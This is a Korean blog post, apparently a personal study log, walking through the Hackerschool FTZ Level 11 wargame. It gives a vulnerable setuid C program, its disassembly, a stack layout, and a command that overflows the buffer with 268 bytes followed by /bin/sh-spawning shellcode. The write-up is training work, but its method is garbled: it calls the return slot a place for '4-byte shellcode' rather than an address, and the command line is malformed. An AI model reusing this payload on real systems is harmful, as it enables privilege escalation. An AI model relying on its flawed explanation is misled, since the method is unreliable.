{"componentChunkName":"component---src-templates-post-template-tsx","path":"/221001/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h3>0. <strong>들어가기 전에</strong></h3>\n<p>조금 더 어려운 BOF문제! 물론 BOF가 아니고 Format String 기법으로도 공격할 수 있지만, 기왕 BOF 연습중인거 BOF로 풀었다.</p>\n<h3>1. <strong>Level 11</strong></h3>\n<p>이것 또한 BOF 문제이다. 하지만 이번엔 “진짜” BOF처럼 ret값이 들어가는 주소에 쉘코드를 입력해야 한다. 이는 소스코드를 보면 확인할 수 있다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">#include &lt;stdio.h>\r\n#include &lt;stdlib.h>\r\n\r\nint main( int argc, char *argv[] )\r\n{\r\n        char str[256];\r\n\r\n        setreuid( 3092, 3092 );\r\n        strcpy( str, argv[1] );\r\n        printf( str );\r\n}</code></pre></div>\n<p>attackme의 소스코드다. 음..일단 tmp에 복사해서 한 번 gdb로 디버깅\r\n해보는 것이 좋을 것 같다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">0x08048470 &lt;main+0>:    push   ebp\r\n0x08048471 &lt;main+1>:    mov    ebp,esp\r\n0x08048473 &lt;main+3>:    sub    esp,0x108\r\n0x08048479 &lt;main+9>:    sub    esp,0x8\r\n0x0804847c &lt;main+12>:   push   0xc14\r\n0x08048481 &lt;main+17>:   push   0xc14\r\n0x08048486 &lt;main+22>:   call   0x804834c &lt;setreuid>\r\n0x0804848b &lt;main+27>:   add    esp,0x10\r\n0x0804848e &lt;main+30>:   sub    esp,0x8\r\n0x08048491 &lt;main+33>:   mov    eax,DWORD PTR [ebp+12]\r\n0x08048494 &lt;main+36>:   add    eax,0x4\r\n0x08048497 &lt;main+39>:   push   DWORD PTR [eax]\r\n0x08048499 &lt;main+41>:   lea    eax,[ebp-264]\r\n0x0804849f &lt;main+47>:   push   eax\r\n0x080484a0 &lt;main+48>:   call   0x804835c &lt;strcpy>\r\n0x080484a5 &lt;main+53>:   add    esp,0x10\r\n0x080484a8 &lt;main+56>:   sub    esp,0xc\r\n0x080484ab &lt;main+59>:   lea    eax,[ebp-264]\r\n0x080484b1 &lt;main+65>:   push   eax\r\n0x080484b2 &lt;main+66>:   call   0x804833c &lt;printf></code></pre></div>\n<p>다음과 같은 코드가 뜨는데, 차근차근 분석해보면\r\nebp-264 시점에 우리의 str[256]이 선언되는 것 같다. strcpy는 길이 체크를 하지 않으니\r\n버퍼오버플로우의 취약점이 보인다.</p>\n<p>일단 264-256을 해서 더미데이터가 8바이트 존재하는걸 확인할 수 있다. 또한 기본적으로 SFP 4바이트와\r\nret 4바이트가 존재할 것이다. 따라서 스택구조를 재구성해보면 :</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">str[256]\r\ndummy[8]\r\nsfp[4]\r\nret[4]</code></pre></div>\n<p>처럼 될 것이다. 우리가 조작하고자 하는 겂은 ret값이니 우리는 총 268바이트를 사용해\r\n뭔가를 채우고, ret에 4바이트 쉘코드를 넣어 attackme를 실행시키면 될 것 같다.</p>\n<p>여기서 ret니 sfp니 아무것도 모르겠다면, 컴퓨터 구조(특히 레지스터)와 어셈블리에 대한 공부가 더 필요하다고 볼 수 있겠다. 간단히만 말하자면 ret는 return해서 돌아가는 주소이고(즉, 함수가 완료될떄 다음에 실행될 코드) sfp는 현재 스택의 기준을 잡는 값으로, 만약 이게 상위에서 호출된 함수라면 그 상위 함수의 위치값을 저장해 완료시 돌아갈 위치를 세이브해준다고 생각하면 된다.</p>\n<p>이런걸 보면 확실히 리버싱 공부를 더 해야할 것 같다. 이런 예제야 쉽지만…</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">./attackme 'python-c'print\"A\"*268+\r\n\"\\x31\\xc0\\xb0\\x31\\xcd\\x80\\x89\\xc3\\x89\\xc1\\x31\\xc0\\xb0\\x46\\xcd\\\r\nx80\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\\r\nx53\\x89\\xe1\\x89\\xc2\\xb0\\x0b\\xcd\\x80\\x31\\xc0\\xb0\\x01\\xcd\\x80\"'\r\n\r\n//작성한 쉘 코드.</code></pre></div>\n<p>쉘코드는 인터넷에 널려있다. 스스로 만들기는 아직 실력이 좀 부족하다.</p>\n<p>아, 그리고 쉘코드가 4바이트가 넘어가는 경우도 허다한데, 이런 경우는 환경변수 등록을\r\n통해 등록된 환경변수의 주소를 return값으로 넘겨주면 된다. 이에 대해선 level12에서\r\n다루도록 하겠다.</p>\n<p>비밀번호 : it is like this</p>\n<hr>\n<h2>Source</h2>\n<ul>\n<li>해커스쿨 FTZ</li>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"시스템 해킹(9) : 해커스쿨 FTZ 레벨 11","summary":"","date":"2022.10.01.","before":"2022.09.30.","after":"2022.10.01.","categories":["C-SEC","KOR"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/jpeg;base64,/9j/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAANABQDASIAAhEBAxEB/8QAGQAAAgMBAAAAAAAAAAAAAAAAAAYBBAcJ/8QAFQEBAQAAAAAAAAAAAAAAAAAABQT/2gAMAwEAAhADEAAAAecqxk1Wh+RFETf/xAAbEAACAwEBAQAAAAAAAAAAAAAEBQECAwYAB//aAAgBAQABBQLk/ozxAp6+x250njzKluVRkeVbT188ot//xAAfEQACAgIBBQAAAAAAAAAAAAACAwEEERMSACFRktL/2gAIAQMBAT8B2ipFjU+yabLh3VyNorN1QQFT5GXGOYTKlxiOWAzy7zES0vA+0/PX/8QAHREAAgIDAAMAAAAAAAAAAAAAAgMBBBITIQAx0f/aAAgBAgEBPwGuMuOvJoppdUSYJeCVbhTaYb2I2CkSIJsG50wXM2nOMz0t7I5krnPR/PP/xAAmEAACAQIGAQQDAAAAAAAAAAABAgMEEgAFERMhMSIUFSNBMpLh/9oACAEBAAY/Aq/KJs3zY0sdJFQ5E0NXLTS5PPNOWhqKYMHtowj1Hqqa2QS7aIgAYuPccyzQZjIslRTpWqoaOojgndd7eXht1bXSxdOT4AnHLc/ficEaq61NHJQkSC/bjHzI8Wv4yo6eL92ySL0xxtONVU3qLmtTstYo0CljoSR9jrHCn9v5j//EABwQAQEAAgIDAAAAAAAAAAAAAAERACFBUTFxgf/aAAgBAQABPyHWJvxKWgfi8l2Skpfpos8FGJji06G0TyMHZz1jUCzgTuk9EUsRNJkdSKwnsSquMiP35+M//9oADAMBAAIAAwAAABCQH//EABgRAQEBAQEAAAAAAAAAAAAAAAERACFx/9oACAEDAQE/EE+TpdStOdiavBQ21X17v//EABkRAAIDAQAAAAAAAAAAAAAAABEhAAFBMf/aAAgBAgEBPxB+k27FYwBSsS4wEHlQrAzBqpT/xAAZEAEBAQEBAQAAAAAAAAAAAAABESEAMUH/2gAIAQEAAT8Qm5D613Vaz4sCNvgJQCOeKY0zpwewxUIRguqIInPHcqiaKJ4IxFQZhRsyiwbhBPoTrDrq6VSjvqK/Xv/Z"},"images":{"fallback":{"src":"/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg","srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e6e0/C_Sec.jpg 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/edde1/C_Sec.jpg 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg 1080w","sizes":"(min-width: 1080px) 1080px, 100vw"},"sources":[{"srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e1cd/C_Sec.webp 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/08f1e/C_Sec.webp 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/c34ed/C_Sec.webp 1080w","type":"image/webp","sizes":"(min-width: 1080px) 1080px, 100vw"}]},"width":1080,"height":720}},"publicURL":"/static/19e515bba8750881aa8c0a71dc14e660/C_Sec.jpg"}}}}]}},"pageContext":{"slug":"/221001/"}},"staticQueryHashes":[]}